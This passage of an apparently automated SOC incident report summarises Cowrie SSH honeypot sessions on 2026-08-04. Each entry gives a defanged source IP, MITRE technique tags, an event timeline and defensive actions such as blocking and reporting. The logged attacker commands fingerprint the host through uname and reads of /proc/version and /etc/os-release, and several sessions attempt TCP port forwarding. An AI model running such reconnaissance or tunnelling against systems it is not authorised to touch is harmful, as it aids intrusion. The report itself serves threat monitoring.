| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:23:23` | `cowrie.session.connect` |
| `2026-08-04 13:23:24` | `cowrie.client.version` |
| `2026-08-04 13:23:24` | `cowrie.client.kex` |
| `2026-08-04 13:23:25` | `cowrie.login.success` |
| `2026-08-04 13:23:27` | `cowrie.session.params` |
| `2026-08-04 13:23:27` | `cowrie.command.input` |
| `2026-08-04 13:23:27` | `cowrie.command.input` |
| `2026-08-04 13:23:27` | `cowrie.command.input` |
| `2026-08-04 13:23:27` | `cowrie.command.input` |
| `2026-08-04 13:23:27` | `cowrie.command.input` |
| `2026-08-04 13:23:27` | `cowrie.command.success` |
| `2026-08-04 13:23:27` | `cowrie.command.input` |
| `2026-08-04 13:23:27` | `cowrie.command.input` |
| `2026-08-04 13:23:27` | `cowrie.command.input` |
| `2026-08-04 13:23:27` | `cowrie.command.input` |
| `2026-08-04 13:23:28` | `cowrie.log.closed` |
| `2026-08-04 13:23:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afe698a39e39

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:24 |
| **Last Seen** | 2026-08-04 13:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:24:59` | `cowrie.session.connect` |
| `2026-08-04 13:24:59` | `cowrie.client.version` |
| `2026-08-04 13:24:59` | `cowrie.client.kex` |
| `2026-08-04 13:25:00` | `cowrie.login.success` |
| `2026-08-04 13:25:01` | `cowrie.session.params` |
| `2026-08-04 13:25:01` | `cowrie.command.input` |
| `2026-08-04 13:25:01` | `cowrie.command.input` |
| `2026-08-04 13:25:01` | `cowrie.command.input` |
| `2026-08-04 13:25:01` | `cowrie.command.input` |
| `2026-08-04 13:25:01` | `cowrie.command.input` |
| `2026-08-04 13:25:01` | `cowrie.command.success` |
| `2026-08-04 13:25:01` | `cowrie.command.input` |
| `2026-08-04 13:25:01` | `cowrie.command.input` |
| `2026-08-04 13:25:01` | `cowrie.command.input` |
| `2026-08-04 13:25:01` | `cowrie.command.input` |
| `2026-08-04 13:25:02` | `cowrie.log.closed` |
| `2026-08-04 13:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7da0757d0358

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:26 |
| **Last Seen** | 2026-08-04 13:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:26:39` | `cowrie.session.connect` |
| `2026-08-04 13:26:39` | `cowrie.client.version` |
| `2026-08-04 13:26:39` | `cowrie.client.kex` |
| `2026-08-04 13:26:40` | `cowrie.login.success` |
| `2026-08-04 13:26:41` | `cowrie.session.params` |
| `2026-08-04 13:26:41` | `cowrie.command.input` |
| `2026-08-04 13:26:41` | `cowrie.command.input` |
| `2026-08-04 13:26:41` | `cowrie.command.input` |
| `2026-08-04 13:26:41` | `cowrie.command.input` |
| `2026-08-04 13:26:41` | `cowrie.command.input` |
| `2026-08-04 13:26:41` | `cowrie.command.success` |
| `2026-08-04 13:26:41` | `cowrie.command.input` |
| `2026-08-04 13:26:41` | `cowrie.command.input` |
| `2026-08-04 13:26:41` | `cowrie.command.input` |
| `2026-08-04 13:26:41` | `cowrie.command.input` |
| `2026-08-04 13:26:42` | `cowrie.log.closed` |
| `2026-08-04 13:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbb16cc76bfa

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]206` |
| **First Seen** | 2026-08-04 13:27 |
| **Last Seen** | 2026-08-04 13:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:27:47` | `cowrie.session.connect` |
| `2026-08-04 13:27:47` | `cowrie.client.version` |
| `2026-08-04 13:27:47` | `cowrie.client.kex` |
| `2026-08-04 13:27:47` | `cowrie.login.success` |
| `2026-08-04 13:27:47` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:27:48` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]206` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b030f6291c24

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-04 13:28 |
| **Last Seen** | 2026-08-04 13:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:28:19` | `cowrie.session.connect` |
| `2026-08-04 13:28:19` | `cowrie.client.version` |
| `2026-08-04 13:28:19` | `cowrie.client.kex` |
| `2026-08-04 13:28:19` | `cowrie.login.success` |
| `2026-08-04 13:28:19` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:28:20` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baef75bfdb35

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:28 |
| **Last Seen** | 2026-08-04 13:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:28:19` | `cowrie.session.connect` |
| `2026-08-04 13:28:19` | `cowrie.client.version` |
| `2026-08-04 13:28:19` | `cowrie.client.kex` |
| `2026-08-04 13:28:21` | `cowrie.login.success` |
| `2026-08-04 13:28:22` | `cowrie.session.params` |
| `2026-08-04 13:28:22` | `cowrie.command.input` |
| `2026-08-04 13:28:22` | `cowrie.command.input` |
| `2026-08-04 13:28:22` | `cowrie.command.input` |
| `2026-08-04 13:28:22` | `cowrie.command.input` |
| `2026-08-04 13:28:22` | `cowrie.command.input` |
| `2026-08-04 13:28:22` | `cowrie.command.success` |
| `2026-08-04 13:28:22` | `cowrie.command.input` |
| `2026-08-04 13:28:22` | `cowrie.command.input` |
| `2026-08-04 13:28:22` | `cowrie.command.input` |
| `2026-08-04 13:28:22` | `cowrie.command.input` |
| `2026-08-04 13:28:23` | `cowrie.log.closed` |
| `2026-08-04 13:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2a6ebfeb402

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:30 |
| **Last Seen** | 2026-08-04 13:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:30:00` | `cowrie.session.connect` |
| `2026-08-04 13:30:00` | `cowrie.client.version` |
| `2026-08-04 13:30:00` | `cowrie.client.kex` |
| `2026-08-04 13:30:02` | `cowrie.login.success` |
| `2026-08-04 13:30:03` | `cowrie.session.params` |
| `2026-08-04 13:30:03` | `cowrie.command.input` |
| `2026-08-04 13:30:03` | `cowrie.command.input` |
| `2026-08-04 13:30:03` | `cowrie.command.input` |
| `2026-08-04 13:30:03` | `cowrie.command.input` |
| `2026-08-04 13:30:03` | `cowrie.command.input` |
| `2026-08-04 13:30:03` | `cowrie.command.success` |
| `2026-08-04 13:30:03` | `cowrie.command.input` |
| `2026-08-04 13:30:03` | `cowrie.command.input` |
| `2026-08-04 13:30:03` | `cowrie.command.input` |
| `2026-08-04 13:30:03` | `cowrie.command.input` |
| `2026-08-04 13:30:03` | `cowrie.log.closed` |
| `2026-08-04 13:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c8f730540c4

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-04 13:30 |
| **Last Seen** | 2026-08-04 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:30:05` | `cowrie.session.connect` |
| `2026-08-04 13:30:05` | `cowrie.client.version` |
| `2026-08-04 13:30:05` | `cowrie.client.kex` |
| `2026-08-04 13:30:06` | `cowrie.login.success` |
| `2026-08-04 13:30:06` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:30:06` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e7486c9e1f2

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-04 13:31 |
| **Last Seen** | 2026-08-04 13:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:31:39` | `cowrie.session.connect` |
| `2026-08-04 13:31:39` | `cowrie.client.version` |
| `2026-08-04 13:31:39` | `cowrie.client.kex` |
| `2026-08-04 13:31:40` | `cowrie.login.success` |
| `2026-08-04 13:31:40` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:31:40` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2b023d73b4f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:31 |
| **Last Seen** | 2026-08-04 13:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:31:45` | `cowrie.session.connect` |
| `2026-08-04 13:31:46` | `cowrie.client.version` |
| `2026-08-04 13:31:46` | `cowrie.client.kex` |
| `2026-08-04 13:31:47` | `cowrie.login.success` |
| `2026-08-04 13:31:48` | `cowrie.session.params` |
| `2026-08-04 13:31:48` | `cowrie.command.input` |
| `2026-08-04 13:31:48` | `cowrie.command.input` |
| `2026-08-04 13:31:48` | `cowrie.command.input` |
| `2026-08-04 13:31:48` | `cowrie.command.input` |
| `2026-08-04 13:31:48` | `cowrie.command.input` |
| `2026-08-04 13:31:48` | `cowrie.command.success` |
| `2026-08-04 13:31:48` | `cowrie.command.input` |
| `2026-08-04 13:31:48` | `cowrie.command.input` |
| `2026-08-04 13:31:48` | `cowrie.command.input` |
| `2026-08-04 13:31:48` | `cowrie.command.input` |
| `2026-08-04 13:31:48` | `cowrie.log.closed` |
| `2026-08-04 13:31:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9f3a2c4d4a7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:32 |
| **Last Seen** | 2026-08-04 13:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:32:40` | `cowrie.session.connect` |
| `2026-08-04 13:32:40` | `cowrie.client.version` |
| `2026-08-04 13:32:40` | `cowrie.client.kex` |
| `2026-08-04 13:32:40` | `cowrie.login.success` |
| `2026-08-04 13:32:41` | `cowrie.session.params` |
| `2026-08-04 13:32:41` | `cowrie.command.input` |
| `2026-08-04 13:32:41` | `cowrie.log.closed` |
| `2026-08-04 13:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-292622f61dbe

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:33 |
| **Last Seen** | 2026-08-04 13:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:33:24` | `cowrie.session.connect` |
| `2026-08-04 13:33:24` | `cowrie.client.version` |
| `2026-08-04 13:33:24` | `cowrie.client.kex` |
| `2026-08-04 13:33:25` | `cowrie.login.success` |
| `2026-08-04 13:33:27` | `cowrie.session.params` |
| `2026-08-04 13:33:27` | `cowrie.command.input` |
| `2026-08-04 13:33:27` | `cowrie.command.input` |
| `2026-08-04 13:33:27` | `cowrie.command.input` |
| `2026-08-04 13:33:27` | `cowrie.command.input` |
| `2026-08-04 13:33:27` | `cowrie.command.input` |
| `2026-08-04 13:33:27` | `cowrie.command.success` |
| `2026-08-04 13:33:27` | `cowrie.command.input` |
| `2026-08-04 13:33:27` | `cowrie.command.input` |
| `2026-08-04 13:33:27` | `cowrie.command.input` |
| `2026-08-04 13:33:27` | `cowrie.command.input` |
| `2026-08-04 13:33:27` | `cowrie.log.closed` |
| `2026-08-04 13:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e6198f719ef

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:34 |
| **Last Seen** | 2026-08-04 13:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:34:25` | `cowrie.session.connect` |
| `2026-08-04 13:34:25` | `cowrie.client.version` |
| `2026-08-04 13:34:25` | `cowrie.client.kex` |
| `2026-08-04 13:34:25` | `cowrie.login.success` |
| `2026-08-04 13:34:26` | `cowrie.session.params` |
| `2026-08-04 13:34:26` | `cowrie.command.input` |
| `2026-08-04 13:34:26` | `cowrie.log.closed` |
| `2026-08-04 13:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6701c0302b0b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:34 |
| **Last Seen** | 2026-08-04 13:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:34:53` | `cowrie.session.connect` |
| `2026-08-04 13:34:53` | `cowrie.client.version` |
| `2026-08-04 13:34:53` | `cowrie.client.kex` |
| `2026-08-04 13:34:54` | `cowrie.login.success` |
| `2026-08-04 13:34:55` | `cowrie.session.params` |
| `2026-08-04 13:34:55` | `cowrie.command.input` |
| `2026-08-04 13:34:55` | `cowrie.command.input` |
| `2026-08-04 13:34:55` | `cowrie.command.input` |
| `2026-08-04 13:34:55` | `cowrie.command.input` |
| `2026-08-04 13:34:56` | `cowrie.command.input` |
| `2026-08-04 13:34:56` | `cowrie.command.success` |
| `2026-08-04 13:34:56` | `cowrie.command.input` |
| `2026-08-04 13:34:56` | `cowrie.command.input` |
| `2026-08-04 13:34:56` | `cowrie.command.input` |
| `2026-08-04 13:34:56` | `cowrie.command.input` |
| `2026-08-04 13:34:56` | `cowrie.log.closed` |
| `2026-08-04 13:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b0a12ef4714

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:36 |
| **Last Seen** | 2026-08-04 13:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:36:05` | `cowrie.session.connect` |
| `2026-08-04 13:36:05` | `cowrie.client.version` |
| `2026-08-04 13:36:05` | `cowrie.client.kex` |
| `2026-08-04 13:36:05` | `cowrie.login.success` |
| `2026-08-04 13:36:06` | `cowrie.session.params` |
| `2026-08-04 13:36:06` | `cowrie.command.input` |
| `2026-08-04 13:36:06` | `cowrie.log.closed` |
| `2026-08-04 13:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a5deb0eb5c6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:36 |
| **Last Seen** | 2026-08-04 13:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:36:21` | `cowrie.session.connect` |
| `2026-08-04 13:36:21` | `cowrie.client.version` |
| `2026-08-04 13:36:21` | `cowrie.client.kex` |
| `2026-08-04 13:36:23` | `cowrie.login.success` |
| `2026-08-04 13:36:24` | `cowrie.session.params` |
| `2026-08-04 13:36:24` | `cowrie.command.input` |
| `2026-08-04 13:36:24` | `cowrie.command.input` |
| `2026-08-04 13:36:24` | `cowrie.command.input` |
| `2026-08-04 13:36:24` | `cowrie.command.input` |
| `2026-08-04 13:36:24` | `cowrie.command.input` |
| `2026-08-04 13:36:24` | `cowrie.command.success` |
| `2026-08-04 13:36:24` | `cowrie.command.input` |
